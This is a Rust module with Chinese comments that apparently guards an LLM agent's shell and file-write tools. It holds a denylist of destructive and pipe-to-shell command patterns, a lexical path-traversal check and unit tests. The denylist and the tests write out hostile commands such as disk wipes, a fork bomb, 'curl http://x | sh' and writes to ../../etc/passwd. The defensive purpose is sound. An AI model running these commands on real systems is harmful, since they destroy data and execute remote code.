//! 工具护栏：危险命令 / 路径越界检测。
//!
//! P2.2 为字符串子串 denylist + 路径词法约束（无 regex 依赖）。
//! 完整的目标白名单 / scope glob / 路径 canonicalize 约束留 P6。

use std::path::{Path, PathBuf};

use crate::tool::ToolCtx;

/// 危险命令子串 denylist（小写匹配）。
///
/// 注意：`curl`/`wget` 本身是常用 recon 工具，不禁；仅禁管道送 shell 执行。
const DANGEROUS: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "rm -rf $home",
    ":(){:|:&};:",
    ":(){",
    "fork bomb",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",
    "mkfs",
    "dd if=",
    "of=/dev/sd",
    "of=/dev/nvme",
    "of=/dev/hd",
    "of=/dev/disk",
    "> /dev/sd",
    "chmod -R 777 /",
    "chmod -R 000 /",
    "chown -R",
    "| sh",
    "| bash",
    "| zsh",
    "|sh",
    "|bash",
    "curl ",
    "wget ",
];

/// 检查命令是否被护栏拒绝。`Ok(())` 放行；`Err(reason)` 拒绝（reason 回灌给 LLM）。
pub fn check_command(cmd: &str, ctx: &ToolCtx) -> std::result::Result<(), String> {
    let lower = cmd.to_lowercase();
    for &pat in DANGEROUS {
        if lower.contains(pat) {
            // `curl `/`wget ` 单独出现仅作可疑标记：若同时含 `| sh`/`-o`/`-O` 才拒绝；
            // 否则放行（recon 场景常用 curl 抓取）。这里简化：curl/wget 一律提示需 scope。
            if pat == "curl " || pat == "wget " {
                if lower.contains("| sh")
                    || lower.contains("| bash")
                    || lower.contains("|sh")
                    || lower.contains("|bash")
                {
                    return Err(format!("被安全护栏拒绝：禁止管道至 shell 执行（{pat}…）"));
                }
                continue;
            }
            return Err(format!("被安全护栏拒绝：命中危险模式 `{pat}`"));
        }
    }
    // rules 关键词检查（粗粒度）：若 rule 含"禁止"/"禁"+ 命令含相关词，提示。
    // P2.2 不做语义匹配，仅 denylist；rules 已注入系统提示词由模型遵守。
    let _ = ctx;
    Ok(())
}

/// 检查写路径是否越界（词法约束：不允许 `..` 逃逸 cwd）。
pub fn check_write_path(path: &Path, ctx: &ToolCtx) -> std::result::Result<(), String> {
    let resolved = resolve_under_cwd(path, &ctx.cwd)?;
    // 不允许写出到 cwd 之外
    if !resolved.starts_with(&ctx.cwd) {
        return Err(format!(
            "被安全护栏拒绝：路径 `{}` 逃逸出工作目录 {}",
            path.display(),
            ctx.cwd.display()
        ));
    }
    Ok(())
}

/// 把 `path` 相对 `cwd` 解析，规范化 `.`/`..`（词法，不访问文件系统）。
/// 返回绝对路径。`..` 逃逸 cwd 仍返回（由调用方判断 starts_with）。
pub(crate) fn resolve_under_cwd(path: &Path, cwd: &Path) -> std::result::Result<PathBuf, String> {
    let p = if path.is_absolute() {
        path.to_path_buf()
    } else {
        cwd.join(path)
    };
    // 词法规范化
    let mut out: Vec<std::path::Component> = Vec::new();
    for comp in p.components() {
        match comp {
            std::path::Component::ParentDir => {
                if matches!(
                    out.last(),
                    Some(std::path::Component::Normal(_)) | Some(std::path::Component::CurDir)
                ) {
                    out.pop();
                } else {
                    out.push(comp);
                }
            }
            std::path::Component::CurDir => {}
            other => out.push(other),
        }
    }
    Ok(out.iter().collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx(cwd: &str) -> ToolCtx {
        ToolCtx {
            cwd: PathBuf::from(cwd),
            rules: vec![],
            scope: None,
        }
    }

    #[test]
    fn allows_safe_commands() {
        let c = ctx("/tmp");
        assert!(check_command("ls -la", &c).is_ok());
        assert!(check_command("echo hello", &c).is_ok());
        assert!(check_command("nmap -sV example.com", &c).is_ok());
    }

    #[test]
    fn rejects_rm_rf_root() {
        let c = ctx("/tmp");
        assert!(check_command("rm -rf /", &c).is_err());
        assert!(check_command("RM -RF /", &c).is_err(), "应大小写不敏感");
        assert!(check_command("rm -rf ~", &c).is_err());
    }

    #[test]
    fn rejects_pipe_to_shell() {
        let c = ctx("/tmp");
        assert!(check_command("curl http://x | sh", &c).is_err());
        assert!(check_command("wget http://x | bash", &c).is_err());
    }

    #[test]
    fn rejects_shutdown_mkfs_dd() {
        let c = ctx("/tmp");
        assert!(check_command("shutdown now", &c).is_err());
        assert!(check_command("mkfs.ext4 /dev/sda1", &c).is_err());
        assert!(check_command("dd if=/dev/zero of=/dev/sda", &c).is_err());
    }

    #[test]
    fn write_path_rejects_traversal() {
        let c = ctx("/tmp/proj");
        assert!(check_write_path(Path::new("../../etc/passwd"), &c).is_err());
        assert!(check_write_path(Path::new("/etc/passwd"), &c).is_err());
    }

    #[test]
    fn write_path_allows_within_cwd() {
        let c = ctx("/tmp/proj");
        assert!(check_write_path(Path::new("a.txt"), &c).is_ok());
        assert!(check_write_path(Path::new("sub/b.txt"), &c).is_ok());
    }
}
